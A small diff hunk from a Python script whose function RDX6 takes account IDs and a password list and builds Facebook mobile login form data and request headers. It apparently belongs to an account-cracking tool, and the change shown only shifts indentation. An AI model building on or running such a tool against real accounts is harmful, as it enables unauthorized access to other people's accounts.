@@ -1549,7 +1549,7 @@ def RDX6(ids,passlist):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-                        header_freefb = {'authority':'p.facebook.com',
+                         header_freefb = {'authority':'p.facebook.com',
 			'upgrade-insecure-requests': '1',
 			'viewport-width': '980',
 			'method': 'path',
